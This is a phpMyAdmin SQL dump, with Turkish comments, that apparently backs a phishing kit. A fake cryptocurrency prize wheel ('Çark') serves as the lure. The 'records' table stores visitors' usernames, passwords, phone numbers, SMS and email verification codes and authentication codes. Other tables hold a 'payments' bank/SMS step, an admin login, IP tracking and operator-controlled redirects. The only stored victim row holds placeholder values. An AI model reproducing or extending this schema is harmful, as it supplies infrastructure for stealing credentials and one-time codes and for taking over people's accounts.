-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Anamakine: 127.0.0.1
-- Üretim Zamanı: 23 Nis 2024, 22:31:18
-- Sunucu sürümü: 10.4.27-MariaDB
-- PHP Sürümü: 7.4.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `ganj`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(250) NOT NULL,
  `password` varchar(250) NOT NULL,
  `session_token` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`, `session_token`) VALUES
(1, 'kral', '$2y$10$9Oe9PFbgBlI/f4OOHGfVkuCTf/9NXx89fZx21oPLXf2bxr4wnb2DO', '3063ceb775c314a851239c6e35dbe9b0a8709bb3b43da091332e97d293b9e750');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `bans`
--

CREATE TABLE `bans` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `errors`
--

CREATE TABLE `errors` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `errors`
--

INSERT INTO `errors` (`id`, `ipAddress`, `type`) VALUES
(1, '::1', 'eticaret');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `gifts`
--

CREATE TABLE `gifts` (
  `id` int(11) NOT NULL,
  `gift1` varchar(255) DEFAULT NULL,
  `gift2` varchar(255) DEFAULT NULL,
  `gift3` varchar(255) DEFAULT NULL,
  `gift4` varchar(255) DEFAULT NULL,
  `gift5` varchar(255) DEFAULT NULL,
  `gift6` varchar(255) DEFAULT NULL,
  `gift7` varchar(255) DEFAULT NULL,
  `gift8` varchar(255) DEFAULT NULL,
  `gift9` varchar(255) DEFAULT NULL,
  `gift10` varchar(255) DEFAULT NULL,
  `gift11` varchar(255) DEFAULT NULL,
  `gift12` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `gifts`
--

INSERT INTO `gifts` (`id`, `gift1`, `gift2`, `gift3`, `gift4`, `gift5`, `gift6`, `gift7`, `gift8`, `gift9`, `gift10`, `gift11`, `gift12`) VALUES
(1, 'BTC', 'ETH', 'SOL', 'XMR', 'TRX', 'BNB', 'BTC', 'ETH', 'TRX', 'SOL', 'SHIBA', 'DOGE');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ips`
--

CREATE TABLE `ips` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `os` varchar(255) NOT NULL,
  `lastOnline` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `ips`
--

INSERT INTO `ips` (`id`, `ipAddress`, `os`, `lastOnline`) VALUES
(1, '::1', 'WinNT', '1713904285');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `payments`
--

CREATE TABLE `payments` (
  `id` int(11) NOT NULL,
  `token` varchar(100) NOT NULL,
  `bank` varchar(255) NOT NULL,
  `type` enum('sms','error_sms') NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `records`
--

CREATE TABLE `records` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `page` varchar(255) DEFAULT NULL,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `phone_sms` varchar(100) DEFAULT NULL,
  `mail_sms` varchar(100) DEFAULT NULL,
  `hotmail` varchar(100) DEFAULT NULL,
  `auth` varchar(100) DEFAULT NULL,
  `lastOnline` varchar(255) NOT NULL,
  `control` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `records`
--

INSERT INTO `records` (`id`, `ipAddress`, `page`, `username`, `password`, `phone`, `phone_sms`, `mail_sms`, `hotmail`, `auth`, `lastOnline`, `control`) VALUES
(6, '::1', 'Çark', 'adadas', 'adsdas', '2321313231', 'sadddd', '654654', NULL, '333333', '1713904285', '');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `redirect`
--

CREATE TABLE `redirect` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `page` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `redirect`
--

INSERT INTO `redirect` (`id`, `ipAddress`, `page`) VALUES
(1, '', 'basagonder'),
(2, '', 'basagonder');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `bans`
--
ALTER TABLE `bans`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `errors`
--
ALTER TABLE `errors`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `gifts`
--
ALTER TABLE `gifts`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `ips`
--
ALTER TABLE `ips`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `payments`
--
ALTER TABLE `payments`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `records`
--
ALTER TABLE `records`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `redirect`
--
ALTER TABLE `redirect`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `bans`
--
ALTER TABLE `bans`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `errors`
--
ALTER TABLE `errors`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- Tablo için AUTO_INCREMENT değeri `gifts`
--
ALTER TABLE `gifts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `ips`
--
ALTER TABLE `ips`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `payments`
--
ALTER TABLE `payments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `records`
--
ALTER TABLE `records`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- Tablo için AUTO_INCREMENT değeri `redirect`
--
ALTER TABLE `redirect`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=110;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
